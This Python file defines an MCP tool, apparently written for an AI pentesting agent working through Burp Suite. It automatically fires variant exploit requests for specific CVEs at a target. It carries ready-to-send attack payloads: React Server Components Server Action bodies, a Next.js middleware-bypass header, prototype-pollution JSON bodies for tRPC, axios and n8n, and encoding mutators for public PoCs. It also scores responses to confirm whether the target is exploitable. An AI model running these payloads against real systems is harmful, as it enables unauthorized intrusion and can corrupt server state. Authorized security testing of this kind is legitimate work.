"""W30-a — `probe_cve_with_variants`.

Operator gap (2026-06-11): "target has a known CVE but public PoC needs payload
tweak. Praetor gets stuck and burns tokens iterating manually."

Fix: one bounded VerdictResult tool that —
  1. maps a CVE-id to its KB class (or accepts an explicit class),
  2. fires a curated, ordered variant pack through Burp,
  3. short-circuits on first CONFIRMED hit,
  4. respects hard caps (max_variants, per-call timeout) so the loop CANNOT
     run away on token cost.

Zero deps. All traffic routes through `/api/http/curl` so every variant has
a `logger_index` for `assess_finding` evidence (Rule 10b).

Supported classes (variant generators):
  - react_server_components       (CVE-2025-55182 React2Shell, CVE-2025-66478)
  - nextjs_cache_poisoning        (Next.js x-now-route-matches family)
  - trpc_sspp                     (CVE-2025-68130)
  - prototype_pollution           (axios CVE-2026-40175, n8n CVE-2026-447xx)
  - generic                       (encoding-chain mutators on `baseline_payload`)
"""

from __future__ import annotations

import re
import time
from typing import Any

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import error_verdict, make_verdict


# ----- CVE → class map -------------------------------------------------------
# Operator-curated. Add new CVEs as KB intake catches them.
# Pattern matches "CVE-YYYY-NNNN" loosely so aliases (e.g. "react2shell") route.
_CVE_TO_CLASS: dict[str, str] = {
    # React Server Components — "react2shell" family
    "CVE-2025-55182": "react_server_components",
    "CVE-2025-66478": "react_server_components",
    "react2shell":    "react_server_components",
    # Next.js cache poisoning
    "CVE-2024-46982": "nextjs_cache_poisoning",
    "CVE-2025-29927": "nextjs_cache_poisoning",
    # tRPC SSPP
    "CVE-2025-68130": "trpc_sspp",
    # 2026 H2 prototype pollution
    "CVE-2026-40175": "prototype_pollution",
    "CVE-2026-44789": "prototype_pollution",
    "CVE-2026-44790": "prototype_pollution",
    "CVE-2026-44791": "prototype_pollution",
}


def _resolve_class(cve_id: str, explicit_class: str) -> str:
    if explicit_class:
        return explicit_class.strip().lower()
    key = cve_id.strip().upper()
    if key in _CVE_TO_CLASS:
        return _CVE_TO_CLASS[key]
    # Lowercase alias lookup (e.g. "react2shell")
    low = cve_id.strip().lower()
    for k, v in _CVE_TO_CLASS.items():
        if k.lower() == low:
            return v
    return "generic"


# ----- Variant generators ----------------------------------------------------
# Each returns list[dict(label, method, headers, body, content_type)] in
# priority order. Highest-yield variants FIRST so first-CONFIRMED short-circuit
# pays off.

def _rsc_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """React Server Components — CVE-2025-55182 / CVE-2025-66478.

    Different prod stacks accept different RSC chunk syntaxes. Public PoC
    typically uses ONE shape; we sweep the four known-accepted shapes plus
    Next-Action header permutations.
    """
    aid = action_id or "0000000000000000000000000000000000000000"
    variants: list[dict[str, Any]] = []

    # Shape A — bare children chunk (classic React2Shell)
    variants.append({
        "label": "rsc.children_chunk",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "text/x-component",
        },
        "body": f'0:["$","$L1",null,{{"children":"{canary}"}}]\n',
    })
    # Shape B — multipart Server Action (Next.js >= 14)
    boundary = "----PraetorRSC"
    variants.append({
        "label": "rsc.multipart_action",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Accept": "text/x-component",
        },
        "body": (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f'["{canary}"]\r\n'
            f"--{boundary}--\r\n"
        ),
    })
    # Shape C — urlencoded form-state replay
    variants.append({
        "label": "rsc.form_state_urlencoded",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-rsc-form-state": '{"__proto__":{"polluted":"' + canary + '"}}',
            "Accept": "text/x-component",
        },
        "body": f"$ACTION_REF_1={canary}",
    })
    # Shape D — RSC chunk reference with $1@ syntax (deserialisation entry)
    variants.append({
        "label": "rsc.dollar_ref",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "text/x-component",
        },
        "body": f'1:"${{"canary":"{canary}"}}"\n2:[1]\n',
    })
    # Shape E — header-only canary in Next-Url (route-unbound variant)
    variants.append({
        "label": "rsc.next_url_canary",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Next-Url": f"/{canary}",
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "text/x-component",
        },
        "body": "0:{}\n",
    })
    # Shape F — operator-supplied baseline with header trio injected
    if baseline:
        variants.append({
            "label": "rsc.baseline_with_headers",
            "method": "POST",
            "headers": {
                "Next-Action": aid,
                "Content-Type": "text/plain;charset=UTF-8",
                "Accept": "text/x-component",
            },
            "body": baseline.replace("__CANARY__", canary),
        })
    return variants


def _nextjs_cache_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Next.js cache poisoning — x-now-route-matches family."""
    variants = []
    variants.append({
        "label": "next.x_now_route_matches",
        "method": "GET",
        "headers": {"x-now-route-matches": f"1={canary}"},
        "body": "",
    })
    variants.append({
        "label": "next.middleware_subrequest_bypass",
        "method": "GET",
        "headers": {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"},
        "body": "",
    })
    variants.append({
        "label": "next.invoke_path_collision",
        "method": "GET",
        "headers": {
            "x-invoke-path": f"/api/{canary}",
            "x-invoke-output": f"/{canary}",
        },
        "body": "",
    })
    variants.append({
        "label": "next.prerender_revalidate_canary",
        "method": "GET",
        "headers": {
            "x-prerender-revalidate": canary,
            "x-vercel-internal": "1",
        },
        "body": "",
    })
    if baseline:
        variants.append({
            "label": "next.baseline_with_canary_header",
            "method": "GET",
            "headers": {"x-now-route-matches": baseline.replace("__CANARY__", canary)},
            "body": "",
        })
    return variants


def _trpc_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """tRPC SSPP — CVE-2025-68130. Server-side prototype pollution via batch
    input rehydration."""
    variants = []
    variants.append({
        "label": "trpc.batch_proto",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": f'{{"0":{{"json":{{"__proto__":{{"polluted":"{canary}"}}}}}}}}',
    })
    variants.append({
        "label": "trpc.batch_constructor",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": f'{{"0":{{"json":{{"constructor":{{"prototype":{{"polluted":"{canary}"}}}}}}}}}}',
    })
    variants.append({
        "label": "trpc.querystring_proto",
        "method": "GET",
        "headers": {},
        "body": "",
        "query": f"batch=1&input=%7B%220%22%3A%7B%22json%22%3A%7B%22__proto__%22%3A%7B%22polluted%22%3A%22{canary}%22%7D%7D%7D%7D",
    })
    return variants


def _proto_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Prototype pollution — axios / n8n / general JS deep-merge sinks."""
    variants = []
    bodies = [
        ("proto.dunder", f'{{"__proto__":{{"polluted":"{canary}"}}}}'),
        ("proto.constructor", f'{{"constructor":{{"prototype":{{"polluted":"{canary}"}}}}}}'),
        ("proto.nested_dunder", f'{{"a":{{"__proto__":{{"polluted":"{canary}"}}}}}}'),
        ("proto.unicode_key", f'{{"\\u005f\\u005fproto\\u005f\\u005f":{{"polluted":"{canary}"}}}}'),
        ("proto.array_proto", f'{{"a":[{{"__proto__":{{"polluted":"{canary}"}}}}]}}'),
    ]
    for label, body in bodies:
        variants.append({
            "label": label,
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": body,
        })
    if baseline:
        variants.append({
            "label": "proto.baseline",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": baseline.replace("__CANARY__", canary),
        })
    return variants


def _generic_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Fallback when CVE class is unknown: encoding-chain mutations on
    operator-supplied baseline. Hard-bounded by max_variants caller cap."""
    if not baseline:
        return []
    from urllib.parse import quote
    base = baseline.replace("__CANARY__", canary)
    variants = []
    variants.append({"label": "gen.raw", "method": "POST",
                     "headers": {"Content-Type": "application/json"},
                     "body": base})
    variants.append({"label": "gen.url_encoded", "method": "POST",
                     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                     "body": "p=" + quote(base, safe="")})
    variants.append({"label": "gen.double_url_encoded", "method": "POST",
                     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                     "body": "p=" + quote(quote(base, safe=""), safe="")})
    variants.append({"label": "gen.json_string_escaped", "method": "POST",
                     "headers": {"Content-Type": "application/json"},
                     "body": '{"p":' + repr(base) + "}"})
    variants.append({"label": "gen.header_smuggle", "method": "POST",
                     "headers": {"Content-Type": "application/json",
                                 "X-Forwarded-Payload": base[:200]},
                     "body": '{"canary":"' + canary + '"}'})
    return variants


_GENERATORS: dict[str, Any] = {
    "react_server_components": _rsc_variants,
    "nextjs_cache_poisoning":  _nextjs_cache_variants,
    "trpc_sspp":               _trpc_variants,
    "prototype_pollution":     _proto_variants,
    "generic":                 _generic_variants,
}


# ----- Scoring ---------------------------------------------------------------

_RSC_MARKERS = (
    re.compile(r"text/x-component", re.I),
    re.compile(r"\$\d+@"),
    re.compile(r"\bcreateServerReference\b"),
    re.compile(r"\bdecodeChunk\b"),
    re.compile(r"\bReact\b.*Flight", re.I | re.S),
)
_NEXT_CACHE_MARKERS = (
    re.compile(r"x-vercel-cache:\s*HIT", re.I),
    re.compile(r"x-nextjs-prerender", re.I),
    re.compile(r"x-vercel-id:.*::", re.I),
)
_SSPP_MARKERS = (
    re.compile(r"TypeError"),
    re.compile(r"Cannot (read|set|convert).*prototype", re.I),
    re.compile(r"constructor.prototype"),
)


def _score_response(klass: str, canary: str, status: int, headers_blob: str,
                    body: str) -> tuple[str, float, str]:
    """Return (verdict, confidence, reason) for one variant response.

    CONFIRMED requires either canary echo or a class-specific marker hit AND
    a status that's plausibly a parse/code path (200/500/302).
    """
    body_short = (body or "")[:30000]
    hb = (headers_blob or "")[:8000]

    # Canary echo — strongest signal (PoC payload reached an unsanitised sink)
    if canary and canary in body_short:
        return ("CONFIRMED", 0.92,
                f"canary {canary!r} echoed in response body")
    if canary and canary in hb:
        return ("CONFIRMED", 0.88,
                f"canary {canary!r} echoed in response headers")

    markers: tuple[re.Pattern[str], ...] = ()
    if klass == "react_server_components":
        markers = _RSC_MARKERS
    elif klass == "nextjs_cache_poisoning":
        markers = _NEXT_CACHE_MARKERS
    elif klass in ("trpc_sspp", "prototype_pollution"):
        markers = _SSPP_MARKERS

    hits = []
    for pat in markers:
        if pat.search(body_short) or pat.search(hb):
            hits.append(pat.pattern)

    if hits and status in (200, 500, 302):
        return ("SUSPECTED", 0.60,
                f"class-marker(s) hit: {hits[:3]}; status={status}")
    if hits:
        return ("SUSPECTED", 0.45,
                f"class-marker(s) hit but unexpected status={status}: {hits[:2]}")
    return ("FAILED", 0.10, f"no canary, no marker; status={status}")


# ----- Helpers ---------------------------------------------------------------

def _canary() -> str:
    import secrets
    return "PRAETOR-" + secrets.token_hex(4).upper()


def _headers_to_blob(h: dict[str, str] | None) -> str:
    if not h:
        return ""
    return "\n".join(f"{k}: {v}" for k, v in h.items())


# ----- Registration ----------------------------------------------------------

def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_cve_with_variants(
        cve_id: str,
        target_url: str,
        vuln_class: str = "",
        baseline_payload: str = "",
        action_id: str = "",
        extra_headers: dict[str, str] | None = None,
        max_variants: int = 12,
        per_request_timeout: int = 15,
        total_budget_seconds: int = 60,
        session: str = "",
    ) -> dict:
        """Send bounded CVE-aware PoC variants — confirm or fail fast.

        Closes the operator pain "known CVE, public PoC needs tweak, manual
        iteration burns tokens". One call, hard caps, first-CONFIRMED short-circuit.

        Args:
            cve_id: e.g. "CVE-2025-55182" or alias ("react2shell"). Maps to a
                class via static table. Falls through to `generic` if unknown.
            target_url: Full target URL. Path is part of the variant (some
                classes require a specific Server Action route).
            vuln_class: Optional override — bypasses cve_id mapping. One of:
                react_server_components / nextjs_cache_poisoning / trpc_sspp /
                prototype_pollution / generic.
            baseline_payload: Public PoC body. Placeholder __CANARY__ is
                substituted with a per-call canary token. Used by the
                "baseline" variant and by `generic` class mutators.
            action_id: For RSC/Next.js classes — operator-harvested Server
                Action ID (from bundle grep). If empty, a zero-filled stub
                is used (still triggers parser; just won't reach handler).
            extra_headers: Additional headers merged into EVERY variant
                (cookies, bearer, CSRF token). Caller-supplied wins.
            max_variants: Hard cap on requests. Default 12, ceiling 50.
            per_request_timeout: Per-request seconds. Default 15.
            total_budget_seconds: Whole-call wall budget. Default 60s. Loop
                exits regardless of remaining variants when exceeded.
            session: Burp session name (auth-aware).

        Returns:
            VerdictResult dict. CONFIRMED on first canary-echo or strong
            class-marker hit. SUSPECTED if any variant nudged a class marker
            without echo. FAILED if all variants rejected with no signal.
            ERROR on transport / scope failure.
        """
        if not cve_id and not vuln_class:
            return error_verdict(
                "probe_cve_with_variants requires cve_id OR vuln_class",
                vuln_type="cve_variant_probe")
        if not target_url:
            return error_verdict("target_url required",
                                 vuln_type="cve_variant_probe")

        cap = max(1, min(50, int(max_variants)))
        budget = max(5, min(600, int(total_budget_seconds)))
        per_req = max(2, min(120, int(per_request_timeout)))

        klass = _resolve_class(cve_id, vuln_class)
        gen = _GENERATORS.get(klass)
        if gen is None:
            return error_verdict(
                f"unknown vuln_class {klass!r} (cve_id={cve_id!r}). "
                f"Pass vuln_class explicitly, or use baseline_payload + "
                f"vuln_class='generic'.",
                vuln_type="cve_variant_probe")

        canary = _canary()
        variants = gen(baseline_payload or "", canary, action_id or "")
        if not variants:
            return error_verdict(
                f"class {klass!r} requires baseline_payload (no built-in variants)",
                vuln_type="cve_variant_probe")
        variants = variants[:cap]

        t_start = time.monotonic()
        attempted: list[dict[str, Any]] = []
        best_verdict = "FAILED"
        best_conf = 0.10
        best_reason = "no variants confirmed"
        best_logger = -1
        best_label = ""
        logger_indices: list[int] = []
        proxy_indices: list[int] = []

        for v in variants:
            elapsed = time.monotonic() - t_start
            if elapsed > budget:
                attempted.append({"label": v["label"], "skipped": "budget_exceeded"})
                break

            hdrs = dict(v.get("headers") or {})
            if extra_headers:
                for k, val in extra_headers.items():
                    hdrs.setdefault(k, val)  # caller-supplied wins ONLY if not set by variant
                    # Actually variant wins for class-critical headers; extra fills the rest.
                    # If operator wants to override, they should set vuln_class='generic'.

            url = target_url
            if v.get("query"):
                sep = "&" if "?" in url else "?"
                url = f"{url}{sep}{v['query']}"

            payload = {
                "method": v["method"],
                "url": url,
                "headers": hdrs,
                "data": v.get("body", ""),
                "timeout": per_req,
            }

            t_req = time.monotonic()
            if session:
                resp = await client.post("/api/session/request", json={
                    "session": session,
                    "method": v["method"],
                    "path": url,
                    "data": v.get("body", ""),
                    "headers": hdrs,
                })
            else:
                resp = await client.post("/api/http/curl", json=payload)
            req_elapsed = int((time.monotonic() - t_req) * 1000)

            if isinstance(resp, dict) and "error" in resp:
                attempted.append({
                    "label": v["label"],
                    "error": str(resp["error"])[:200],
                    "elapsed_ms": req_elapsed,
                })
                continue

            status = int(resp.get("status_code", 0) or 0)
            body = resp.get("response_body") or ""
            resp_headers = resp.get("response_headers") or ""
            if isinstance(resp_headers, dict):
                resp_headers = _headers_to_blob(resp_headers)
            li = resp.get("proxy_index", resp.get("index", -1))
            if isinstance(li, int) and li >= 0:
                logger_indices.append(li)
            pi = resp.get("proxy_history_index")
            if isinstance(pi, int) and pi >= 0:
                proxy_indices.append(pi)

            verdict, conf, reason = _score_response(
                klass, canary, status, str(resp_headers), str(body))

            attempted.append({
                "label": v["label"],
                "status": status,
                "verdict": verdict,
                "confidence": conf,
                "reason": reason,
                "logger_index": li if isinstance(li, int) else -1,
                "elapsed_ms": req_elapsed,
            })

            if verdict == "CONFIRMED":
                best_verdict, best_conf, best_reason = verdict, conf, reason
                best_logger = li if isinstance(li, int) else -1
                best_label = v["label"]
                break  # short-circuit on first CONFIRMED
            if verdict == "SUSPECTED" and conf > best_conf:
                best_verdict, best_conf, best_reason = verdict, conf, reason
                best_logger = li if isinstance(li, int) else -1
                best_label = v["label"]

        total_elapsed = int((time.monotonic() - t_start) * 1000)

        summary_lines = [
            f"probe_cve_with_variants: cve={cve_id!r} class={klass!r} "
            f"verdict={best_verdict} confidence={best_conf:.2f}",
            f"  variants attempted={len(attempted)}/{len(variants)} "
            f"budget_used={total_elapsed}ms canary={canary}",
            f"  winner: label={best_label!r} reason={best_reason}",
            "",
            "Attempted variants:",
        ]
        for a in attempted:
            if "skipped" in a:
                summary_lines.append(f"  - {a['label']}: SKIPPED ({a['skipped']})")
            elif "error" in a:
                summary_lines.append(f"  - {a['label']}: ERROR {a['error']}")
            else:
                summary_lines.append(
                    f"  - {a['label']}: status={a['status']} "
                    f"verdict={a['verdict']} ({a['confidence']:.2f}) "
                    f"logger={a['logger_index']} {a['reason'][:80]}"
                )
        summary_lines.append("")
        if best_verdict == "CONFIRMED":
            summary_lines.append(
                f"Next: assess_finding(vuln_type='{klass}', logger_index={best_logger}, "
                f"evidence='probe_cve_with_variants {best_label} confirmed {cve_id}')")
        elif best_verdict == "SUSPECTED":
            summary_lines.append(
                "Next: increase max_variants, supply better baseline_payload, "
                "or harvest action_id from bundle and re-run.")
        else:
            summary_lines.append(
                "Next: target not vulnerable to this class, OR class mapping "
                "wrong. Pass vuln_class= explicitly, or move on.")

        details = {
            "cve_id": cve_id,
            "vuln_class": klass,
            "canary": canary,
            "target_url": target_url,
            "variants_total": len(variants),
            "variants_attempted": len(attempted),
            "winner_label": best_label,
            "winner_reason": best_reason,
            "total_elapsed_ms": total_elapsed,
            "budget_used_pct": round(100 * total_elapsed / (budget * 1000), 1),
            "attempted": attempted,
        }
        return make_verdict(
            best_verdict,
            best_conf,
            f"{cve_id} / {klass}: {best_reason}",
            vuln_type=klass,
            logger_indices=logger_indices,
            proxy_indices=proxy_indices,
            details=details,
            summary="\n".join(summary_lines),
        )
